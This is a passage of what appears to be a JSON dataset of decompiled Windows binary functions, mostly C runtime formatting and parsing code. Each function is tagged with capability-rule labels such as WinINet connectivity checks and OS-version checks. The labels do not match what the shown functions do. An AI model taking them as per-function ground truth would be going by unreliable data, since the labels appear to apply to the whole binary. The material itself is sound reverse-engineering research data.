                   if (puVar4 == NULL) {\ncode_r0x0041b6b0:\n                            uStack20 = 5;\n                            iVar9 = (**(*param_4 + 0xc))(uStack40);\n                            param_4 = piStack48;\n                            if (iVar9 == -1) goto code_r0x0041b670;\n                        }\n                        else {\n                            iVar9 = *param_4[0xc];\n                            if (iVar9 < 1) goto code_r0x0041b6b0;\n                            *param_4[0xc] = iVar9 + -1;\n                            *ppuVar3 = puVar4 + 1;\n                            *puVar4 = param_6;\n                        }\n                    }\n                    piStack36 = piStack36 + -1;\n                } while (piStack36 != NULL);\n            }\n            uVar14 = uStack88;\n        }\n        else {\n            uStack60 = param_3;\n            uStack52 = uStack52 & 0xffffff00 | param_3 & 0xff;\n            piStack48 = param_4;\n            if (pcVar12 != NULL) {\n                uStack40 = param_6;\n                do {\n                    if (param_4 == NULL) {\ncode_r0x0041b550:\n                        uStack52 = CONCAT31(uStack52._1_3_, 1);\n                    }\n                    else {\n                        ppuVar3 = param_4[8];\n                        puVar4 = *ppuVar3;\n                        if (puVar4 == NULL) {\ncode_r0x0041b590:\n                            uStack20 = 5;\n                            iVar9 = (**(*param_4 + 0xc))(uStack40);\n                            param_4 = piStack48;\n                            if (iVar9 == -1) goto code_r0x0041b550;\n                        }\n                        else {\n                            iVar9 = *param_4[0xc];\n                            if (iVar9 < 1) goto code_r0x0041b590;\n                            *param_4[0xc] = iVar9 + -1;\n                            *ppuVar3 = puVar4 + 1;\n                            *puVar4 = param_6;\n                        }\n                    }\n                    piStack36 = piStack36 + -1;\n                } while (piStack36 != NULL);\n            }\n            if (piStack44 != NULL) {\n                piVar6 = piStack44;\n                piStack36 = piStack84;\n                if (piStack64 < 0x10) {\n                    piStack36 = &stack0xffffffac;\n                }\n                do {\n                    piVar11 = piVar6;\n                    if (param_4 == NULL) {\ncode_r0x0041b780:\n                        uStack52 = CONCAT31(uStack52._1_3_, 1);\n                    }\n                    else {\n                        uStack40 = piVar6;\n                        uVar2 = *piStack36;\n                        piVar6 = param_4[8];\n                        puVar8 = *piVar6;\n                        if (puVar8 == NULL) {\ncode_r0x0041b7c0:\n                            uStack20 = 5;\n                            iVar9 = (**(*param_4 + 0xc))(uVar2);\n                            piVar11 = uStack40;\n                            param_4 = piStack48;\n                            if (iVar9 == -1) goto code_r0x0041b780;\n                        }\n                        else {\n                            iVar9 = *param_4[0xc];\n                            if (iVar9 < 1) goto code_r0x0041b7c0;\n                            *param_4[0xc] = iVar9 + -1;\n                            *piVar6 = puVar8 + 1;\n                            *puVar8 = uVar2;\n                            piVar11 = uStack40;\n                        }\n                    }\n                    piStack36 = piStack36 + 1;\n                    piVar6 = piVar11 - 1U;\n                } while (piVar11 - 1U != NULL);\n            }\n            uVar14 = uStack60;\n            uStack60._0_1_ = uStack52;\n        }\n        uStack52 = uStack60 | uVar14 & 0xffffff00;\n        piStack36 = NULL;\n    }\n    uStack40 = uStack40 & 0xffffff00 | uStack52 & 0xff;\n    piVar6 = piStack56 - piStack44;\n    piStack48 = param_4;\n    if (piVar6 != NULL) {\n        piVar11 = piStack84;\n        if (piStack64 < 0x10) {\n            piVar11 = &stack0xffffffac;\n        }\n        piVar11 = piVar11 + piStack44;\n        do {\n            if (param_4 == NULL) {\ncode_r0x0041b830:\n                uStack40 = CONCAT31(uStack40._1_3_, 1);\n            }\n            else {\n                piStack56 = piVar6;\n                piStack44 = piVar11;\n                uVar2 = *piVar11;\n                piVar6 = param_4[8];\n                puVar8 = *piVar6;\n                if (puVar8 == NULL) {\ncode_r0x0041b870:\n                    uStack20 = 5;\n                    iVar9 = (**(*param_4 + 0xc))(uVar2);\n                    piVar6 = piStack56;\n                    piVar11 = piStack44;\n                    param_4 = piStack48;\n                    if (iVar9 == -1) goto code_r0x0041b830;\n                }\n                else {\n                    iVar9 = *param_4[0xc];\n                    if (iVar9 < 1) goto code_r0x0041b870;\n                    *param_4[0xc] = iVar9 + -1;\n                    *piVar6 = puVar8 + 1;\n                    *puVar8 = uVar2;\n                    piVar6 = piStack56;\n                    piVar11 = piStack44;\n                }\n            }\n            piVar11 = piVar11 + 1;\n            piVar6 = piVar6 + -1;\n        } while (piVar6 != NULL);\n    }\n    uStack52 = uStack52 & 0xffffff00;\n    uVar14 = uStack40 & 0xff | uStack52;\n    *(param_5 + 0x24) = 0;\n    *(param_5 + 0x20) = 0;\n    if (piStack36 != NULL) {\n        piStack56 = param_6;\n        pcVar12 = piStack36;\n        do {\n            if (param_4 == NULL) {\ncode_r0x0041b8e0:\n                uStack40 = CONCAT31(uStack40._1_3_, 1);\n            }\n            else {\n                ppuVar3 = param_4[8];\n                puVar4 = *ppuVar3;\n                piStack36 = pcVar12;\n                if (puVar4 == NULL) {\ncode_r0x0041b920:\n                    uStack20 = 5;\n                    iVar9 = (**(*param_4 + 0xc))(piStack56);\n                    pcVar12 = piStack36;\n                    param_4 = piStack48;\n                    if (iVar9 == -1) goto code_r0x0041b8e0;\n                }\n                else {\n                    iVar9 = *param_4[0xc];\n                    if (iVar9 < 1) goto code_r0x0041b920;\n                    *param_4[0xc] = iVar9 + -1;\n                    *ppuVar3 = puVar4 + 1;\n                    *puVar4 = param_6;\n                }\n            }\n            pcVar12 = pcVar12 + -1;\n        } while (pcVar12 != NULL);\n        uVar14 = uStack52 | uStack40 & 0xff;\n    }\n    *param_2 = uVar14;\n    param_2[1] = param_4;\n    if (0xf < uStack96) {\n        pcVar12 = pcStack116;\n        if ((0xfff < uStack96 + 1) && (pcVar12 = *(pcStack116 + -4),  0x1f < pcStack116 + (-4 - pcVar12))) {\ncode_r0x0041b9da:\n            uStack20 = 1;\n            fcn.004047f5();\n            goto code_r0x0041b9e6;\n        }\n        fcn.00401a32(pcVar12);\n    }\n    if (0xf < piStack64) {\n        piVar6 = piStack84;\n        if ((0xfff < piStack64 + 1U) && (piVar6 = piStack84[-1],  0x1f < piStack84 + (-4 - piVar6))) {\ncode_r0x0041b9e6:\n            uStack20 = 2;\n            puVar10 = fcn.004047f5();\n            if ((piStack68 != NULL) && (puVar10 = (**(*piStack68 + 8))(),  puVar10 != NULL)) {\n                puVar10 = (***puVar10)(1);\n            }\n            return puVar10;\n        }\n        fcn.00401a32(piVar6);\n    }\n    *in_FS_OFFSET = iStack28;\n    return param_2;\n}\n",
        "token_count": 4686
    },
    "00403ba2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00403ba2(uint32_t *param_1)\n\n{\n    uint32_t *arg_8h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar8;\n    uint16_t uVar9;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iStack20;\n    uint uStack16;\n    ushort uStack12;\n    uint16_t *puStack8;\n    \n    uVar9 = *(param_1 + 0x32);\n    puStack8 = uVar9;\n    if (puStack8 != 0x46) {\n        if (puStack8 == 0x4e) {\n            puStack8 = *param_1 & 8;\n            if (puStack8 != NULL) goto code_r0x0049d806;\n            param_1[7] = 8;\ncode_r0x0049d6d1:\n            puStack8 = 0x49d6d6;\n            puVar6 = fcn.004039a4();\n            *puVar6 = 0x16;\n            puStack8 = 0x49d6e1;\n            uVar7 = fcn.00403751();\n            return uVar7 & 0xffffff00;\n        }\n        if (param_1[0xb] != 0) goto code_r0x0049d6d1;\n        if (uVar9 < 0x6b) {\n            if (uVar9 == 0x6a) {\n                param_1[0xb] = 5;\n                goto code_r0x0049d806;\n            }\n            if (puStack8 == 0x49) {\n                puVar2 = param_1[4];\n                puStack8 = *puVar2;\n                if ((puStack8 == 0x33) && (puVar2[1] == 0x32)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 10;\n                    param_1[4] = puStack8;\n                }\n                else if ((puStack8 == 0x36) && (puVar2[1] == 0x34)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 0xb;\n                    param_1[4] = puStack8;\n                }\n                else if (((((puStack8 == 0x64) || (puStack8 == 0x69)) || (puStack8 == 0x6f)) ||\n                         ((puStack8 == 0x75 || (puStack8 == 0x78)))) || (puStack8 == 0x58)) {\n                    param_1[0xb] = 9;\n                }\n                goto code_r0x0049d806;\n            }\n            if (puStack8 == 0x4c) {\n                param_1[0xb] = 8;\n                goto code_r0x0049d806;\n            }\n            if (puStack8 == 0x54) {\n                param_1[0xb] = 0xd;\n                goto code_r0x0049d806;\n            }\n            if (uVar9 != 0x68) goto code_r0x0049d806;\n            if (*param_1[4] == 0x68) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x1;\n            }\n            else {\n                puStack8 = 0x2;\n            }\n        }\n        else {\n            if (uVar9 != 0x6c) {\n                if (puStack8 == 0x74) {\n                    param_1[0xb] = 7;\n                }\n                else if (puStack8 == 0x77) {\n                    param_1[0xb] = 0xc;\n                }\n                else if (puStack8 == 0x7a) {\n                    param_1[0xb] = 6;\n                }\n                goto code_r0x0049d806;\n            }\n            if (*param_1[4] == 0x6c) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x4;\n            }\n            else {\n                puStack8 = 0x3;\n            }\n        }\n        param_1[0xb] = puStack8;\ncode_r0x0049d806:\n        return CONCAT31(puStack8 >> 8, 1);\n    }\n    puStack8 = *param_1 & 8;\n    if (puStack8 != NULL) goto code_r0x0049d806;\n    param_1[7] = 7;\n    puStack8 = *0x56cca8 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x0049f2ef:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x0049f2f3:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x0049f2f6:\n            cVar5 = fcn.00404ba6(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0049f29b:\n                arg_8h_00 = 0x10;\n                goto code_r0x0049f2f6;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x0049f2af;\n                if (uVar9 < 0x45) goto code_r0x0049f47f;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x0049f47f;\n                    goto code_r0x0049f283;\n                }\n            }\ncode_r0x0049f2ff:\n            cVar5 = fcn.00401e3d();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.00402d60();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x0049f2ff;\n            if (uVar9 != 99) goto code_r0x0049f47f;\ncode_r0x0049f2af:\n            cVar5 = fcn.00404e80(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.00403f49();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x0049f2ff;\n            if (uVar9 == 0x69) goto code_r0x0049f2ef;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.0040547f();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x0049f47f;\n                cVar5 = fcn.00401a5f();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x0049f47f;\n                arg_ch_00 = 0;\n                goto code_r0x0049f29b;\n            }\n            goto code_r0x0049f2f3;\n        }\ncode_r0x0049f283:\n        cVar5 = fcn.004011ae();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0xc) != '\\0')) goto code_r0x0049f47f;\n    arg_ch = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uVar7 = param_1[8];\n    iStack20 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                    iStack20 = 1;\n                }\n                goto code_r0x0049f38a;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        iStack20 = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049f38a:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&stack0xfffffff0 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar8 = 0x78,  iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&stack0xfffffff2 + arg_ch * 2) = uVar8;\n        arg_ch = arg_ch + 2;\n        iStack20 = arg_ch;\n    }\n    arg_8h = param_1 + 0x112;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00405afb(arg_8h, 0x20, arg_10h, param_1 + 6);\n        arg_ch = iStack20;\n    }\n    fcn.00404043(&stack0xfffffff0, arg_ch, param_1 + 6, param_1 + 3);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00405afb(arg_8h, 0x30, arg_10h, param_1 + 6);\n    }\n    fcn.004060a0(0);\n    if ((-1 < param_1[6]) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00405afb(arg_8h, 0x20, arg_10h, param_1 + 6);\n    }\ncode_r0x0049f47f:\n    uVar7 = fcn.00403085(unaff_ESI);\n    return uVar7;\n}\n",
        "token_count": 2659
    },
    "00403bc5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00403bc5(int32_t param_1)\n\n{\n    uchar uVar1;\n    char cVar2;\n    \n    if (*(param_1 + 0x31) != '*') {\n        uVar1 = fcn.0040188e(param_1 + 0x28);\n        return uVar1;\n    }\n    cVar2 = fcn.00406500();\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    cVar2 = fcn.00406528();\n    if ((cVar2 != '\\0') && (*(param_1 + 0x28) < 0)) {\n        *(param_1 + 0x28) = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 169
    },
    "00403c29": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403c29(char *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint uVar6;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n        return 0x16;\n    }\n    if (arg_ch != 0) {\n        *arg_8h = '\\0';\n        iVar3 = arg_10h;\n        if (arg_10h < 1) {\n            iVar3 = 0;\n        }\n        if (arg_ch <= iVar3 + 1U) {\n            puVar2 = fcn.004039a4();\n            uVar6 = 0x22;\n            goto code_r0x004d6fa1;\n        }\n        if (arg_14h != NULL) {\n            pcVar4 = arg_14h[2];\n            *arg_8h = '0';\n            pcVar5 = arg_8h;\n            while( true ) {\n                pcVar5 = pcVar5 + 1;\n                if (arg_10h < 1) break;\n                cVar1 = *pcVar4;\n                if (cVar1 == '\\0') {\n                    cVar1 = '0';\n                }\n                else {\n                    pcVar4 = pcVar4 + 1;\n                }\n                *pcVar5 = cVar1;\n                arg_10h = arg_10h + -1;\n            }\n            *pcVar5 = '\\0';\n            if ((-1 < arg_10h) && (cVar1 = fcn.004d6eb1(pcVar4, *arg_14h, arg_18h, arg_1ch),  cVar1 != '\\0')) {\n                while( true ) {\n                    pcVar5 = pcVar5 + -1;\n                    if (*pcVar5 != '9') break;\n                    *pcVar5 = '0';\n                }\n                *pcVar5 = *pcVar5 + '\\x01';\n            }\n            if (*arg_8h == '1') {\n                arg_14h[1] = arg_14h[1] + 1;\n            }\n            else {\n                pcVar4 = arg_8h + 1;\n                do {\n                    cVar1 = *pcVar4;\n                    pcVar4 = pcVar4 + 1;\n                } while (cVar1 != '\\0');\n                fcn.004058f3(arg_8h, arg_8h + 1, pcVar4 + (1 - (arg_8h + 2)));\n            }\n            return 0;\n        }\n    }\n    puVar2 = fcn.004039a4();\n    uVar6 = 0x16;\ncode_r0x004d6fa1:\n    *puVar2 = uVar6;\n    fcn.00403751();\n    return uVar6;\n}\n",
        "token_count": 707
    },
    "00403c42": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00403c42(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    \n    cVar3 = fcn.00403d1e();\n    if (cVar3 == '\\0') {\n        return 0;\n    }\n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        iVar1 = *(param_1 + 0xaa4);\n        if (param_1 != param_1 + (iVar1 * 4 + 4) * 4) {\n            iVar5 = *(param_1 + 0x14);\n            piVar6 = param_1 + 0x464;\n            do {\n                iVar2 = *piVar6;\n                piVar6[2] = iVar5;\n                if (iVar2 == 1) {\ncode_r0x004a6b10:\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n                }\n                else {\n                    if (iVar2 != 2) {\n                        if (iVar2 == 3) goto code_r0x004a6b10;\n                        if (iVar2 != 4) {\n                            puVar4 = fcn.004039a4();\n                            *puVar4 = 0x16;\n                            fcn.00403751();\n                            return 0;\n                        }\n                    }\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 8;\n                }\n                iVar5 = *(param_1 + 0x14);\n                bVar7 = piVar6 != param_1 + (iVar1 * 4 + 0x119) * 4;\n                piVar6 = piVar6 + 4;\n            } while (bVar7);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 459
    },
    "00403c4c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_13h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00403c4c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uchar uVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uchar *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    char **ppcVar9;\n    char *pcVar10;\n    int32_t arg_10h_00;\n    int32_t unaff_EBP;\n    char *pcVar11;\n    int32_t iVar12;\n    char *pcVar13;\n    uint uVar14;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_13h;\n    uint var_4h;\n    \n    fcn.0040536c(0x7c);\n    iVar12 = *(unaff_EBP + 0x18);\n    arg_10h_00 = *(unaff_EBP + 0x10);\n    uVar7 = *(iVar12 + 0x14);\n    *(unaff_EBP + -0x74) = arg_10h_00;\n    *(unaff_EBP + -0x78) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x58) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x7c) = *(unaff_EBP + 0x1c);\n    if ((uVar7 & 0x3000) == 0x3000) {\n        fcn.0040658c(*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_10h_00, *(unaff_EBP + 0x14), iVar12, *(unaff_EBP + 0x1c))\n        ;\n        goto code_r0x004648b8;\n    }\n    fcn.0040327e(*(iVar12 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.0040632a(unaff_EBP + -0x70);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x80) = piVar5;\n    fcn.004050a6();\n    pcVar1 = *(*piVar5 + 0x14);\n    (**0x573000)(unaff_EBP + -0x50);\n    (*pcVar1)();\n    uVar14 = *(iVar12 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -100) = *(unaff_EBP + -0x78);\n    *(unaff_EBP + -0x54) = 0;\n    *(unaff_EBP + -0x53) = 0;\n    fcn.0040327e(uVar14);\n    *(unaff_EBP + -4) = 2;\n    piVar5 = fcn.004035a8(unaff_EBP + -0x70);\n    *(unaff_EBP + -4) = 1;\n    fcn.004050a6();\n    pcVar1 = *(*piVar5 + 0x1c);\n    (**0x573000)(0x54da00, 0x54da0f, unaff_EBP + -0x20);\n    (*pcVar1)();\n    uVar14 = *(unaff_EBP + -0x58);\n    cVar2 = fcn.00403f7b(uVar14);\n    if (cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        cVar2 = *(arg_10h_00 + 5);\n        if (cVar2 == *(unaff_EBP + -0x15)) {\n            puVar6 = *(unaff_EBP + -0x78);\n            *puVar6 = 0x2b;\n        }\n        else {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.004019e7();\n                cVar2 = *(arg_10h_00 + 5);\n            }\n            if (cVar2 != *(unaff_EBP + -0x16)) goto code_r0x0046434e;\n            puVar6 = *(unaff_EBP + -0x78);\n            *puVar6 = 0x2d;\n        }\n        puVar6 = puVar6 + 1;\n        fcn.00401c5d();\n    }\n    else {\ncode_r0x0046434e:\n        puVar6 = *(unaff_EBP + -100);\n    }\n    piVar5 = *(unaff_EBP + -0x7c);\n    *puVar6 = 0x30;\n    *(unaff_EBP + -0x88) = puVar6;\n    pcVar11 = puVar6 + 1;\n    *(unaff_EBP + -100) = pcVar11;\n    iVar12 = *piVar5;\n    *(unaff_EBP + -0x51) = 0;\n    *(unaff_EBP + -0x68) = 0;\n    *(unaff_EBP + -0x5c) = 0;\n    *(unaff_EBP + -0x84) = ((iVar12 != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar13 = unaff_EBP + -0x50;\n    *(unaff_EBP + -0x60) = pcVar13;\n    if (0xf < *(unaff_EBP + -0x3c)) {\n        pcVar13 = *(unaff_EBP + -0x50);\n        *(unaff_EBP + -0x60) = pcVar13;\n    }\n    if ((*pcVar13 == '\\x7f') || (*pcVar13 < '\\x01')) {\n        cVar2 = fcn.00403f7b(uVar14);\n        if (cVar2 == '\\0') {\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004019e7();\n                }\n                uVar7 = fcn.00402eeb(unaff_EBP + -0x20, *(arg_10h_00 + 5));\n                if (9 < uVar7) break;\n                iVar12 = *(unaff_EBP + -0x68);\n                if (*(unaff_EBP + -0x84) == iVar12 || *(unaff_EBP + -0x84) < iVar12) {\n                    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + 1;\n                    if (uVar7 != 0) {\n                        *(unaff_EBP + -0x53) = 1;\n                    }\n                }\n                else if ((uVar7 != 0) || (iVar12 != 0)) {\n                    *pcVar11 = *(uVar7 + 0x54da00);\n                    pcVar11 = pcVar11 + 1;\n                    *(unaff_EBP + -0x68) = iVar12 + 1;\n                }\n                *(unaff_EBP + -0x51) = 1;\n                fcn.00401c5d();\n                cVar2 = fcn.00403f7b(uVar14);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -100) = pcVar11;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x40) == 0) {\n            *(unaff_EBP + -0x52) = 0;\n        }\n        else {\n            uVar3 = fcn.004058b2();\n            *(unaff_EBP + -0x52) = uVar3;\n        }\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x28) = 0;\n        *(unaff_EBP + -0x24) = 0xf;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040654b(1, 0);\n        *(unaff_EBP + -4) = 4;\n        iVar12 = 0;\n        uVar7 = fcn.00403f7b(*(unaff_EBP + -0x58));\n        if (uVar7 != '\\0') {\n            uVar7 = *(unaff_EBP + -0x24);\n            pcVar13 = *(unaff_EBP + -0x38);\ncode_r0x004644fc:\n            do {\n                pcVar10 = *(unaff_EBP + -0x60);\n                while( true ) {\n                    if ((iVar12 == 0) || (cVar2 = *pcVar10,  *(unaff_EBP + -0x52) = cVar2,  cVar2 == '\\x7f'))\n                    goto code_r0x00464551;\n                    iVar12 = iVar12 + -1;\n                    if (iVar12 != 0) {\n                        pcVar10 = unaff_EBP + -0x38;\n                        if (0xf < uVar7) {\n                            pcVar10 = pcVar13;\n                        }\n                        arg_10h_00 = *(unaff_EBP + -0x74);\n                        if (*(unaff_EBP + -0x52) != pcVar10[iVar12]) goto code_r0x0046454d;\n                    }\n                    if (iVar12 == 0) {\n                        pcVar10 = unaff_EBP + -0x38;\n                        if (0xf < uVar7) {\n                            pcVar10 = pcVar13;\n                        }\n                        arg_10h_00 = *(unaff_EBP + -0x74);\n                        if (*(unaff_EBP + -0x52) < *pcVar10) goto code_r0x0046454d;\n                    }\n                    pcVar10 = *(unaff_EBP + -0x60) + 1;\n                    if (*pcVar10 < '\\x01') break;\n                    *(unaff_EBP + -0x60) = pcVar10;\n                }\n            } while( true );\n        }\n        do {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                uVar7 = fcn.004019e7();\n            }\n            uVar7 = uVar7 & 0xffffff00 | *(arg_10h_00 + 5);\n            *(unaff_EBP + -0x6c) = uVar7;\n            uVar7 = fcn.00402eeb(unaff_EBP + -0x20, uVar7);\n            if (uVar7 < 10) {\n                iVar8 = *(unaff_EBP + -0x68);\n                *(unaff_EBP + -0x51) = 1;\n                if (*(unaff_EBP + -0x84) == iVar8 || *(unaff_EBP + -0x84) < iVar8) {\n                    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + 1;\n                    if (uVar7 != 0) {\n                        *(unaff_EBP + -0x53) = 1;\n                    }\n                }\n                else if ((uVar7 != 0) || (iVar8 != 0)) {\n                    *pcVar11 = *(uVar7 + 0x54da00);\n                    pcVar11 = pcVar11 + 1;\n                    *(unaff_EBP + -100) = pcVar11;\n                    *(unaff_EBP + -0x68) = iVar8 + 1;\n                }\n                iVar8 = unaff_EBP + -0x38;\n                if (0xf < *(unaff_EBP + -0x24)) {\n                    iVar8 = *(unaff_EBP + -0x38);\n                }\n                if (*(iVar8 + iVar12) != '\\x7f') {\n                    iVar8 = unaff_EBP + -0x38;\n                    if (0xf < *(unaff_EBP + -0x24)) {\n                        iVar8 = *(unaff_EBP + -0x38);\n                    }\n                    *(iVar8 + iVar12) = *(iVar8 + iVar12) + '\\x01';\n                }\n            }\n            else {\n                uVar7 = *(unaff_EBP + -0x24);\n                pcVar13 = *(unaff_EBP + -0x38);\n                pcVar10 = unaff_EBP + -0x38;\n                if (0xf < uVar7) {\n                    pcVar10 = pcVar13;\n                }\n                if ((pcVar10[iVar12] == '\\0') || (*(unaff_EBP + -0x52) == '\\0')) goto code_r0x004644df;\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004019e7();\n                    cVar2 = *(arg_10h_00 + 5);\n                    uVar7 = *(unaff_EBP + -0x24);\n                    pcVar13 = *(unaff_EBP + -0x38);\n                }\n                else {\n                    cVar2 = *(unaff_EBP + -0x6c);\n                }\n                if (cVar2 != *(unaff_EBP + -0x52)) goto code_r0x004644df;\n                fcn.00404476(0);\n                iVar12 = iVar12 + 1;\n            }\n            fcn.00401c5d();\n            uVar7 = fcn.00403f7b(*(unaff_EBP + -0x58));\n        } while (uVar7 == '\\0');\n        uVar7 = *(unaff_EBP + -0x24);\n        pcVar13 = *(unaff_EBP + -0x38);\ncode_r0x004644df:\n        if (iVar12 == 0) goto code_r0x004644fc;\n        pcVar10 = unaff_EBP + -0x38;\n        if (0xf < uVar7) {\n            pcVar10 = pcVar13;\n        }\n        if ('\\0' < pcVar10[iVar12]) {\n            iVar12 = iVar12 + 1;\n            goto code_r0x004644fc;\n        }\ncode_r0x0046454d:\n        *(unaff_EBP + -0x54) = 1;\ncode_r0x00464551:\n        *(unaff_EBP + -4) = 1;\n        if (0xf < uVar7) {\n            *(unaff_EBP + -0x6c) = pcVar13;\n            *(unaff_EBP + -0x60) = uVar7 + 1;\n            if (0xfff < uVar7 + 1) {\n                fcn.00404070(unaff_EBP + -0x6c, unaff_EBP + -0x60);\n                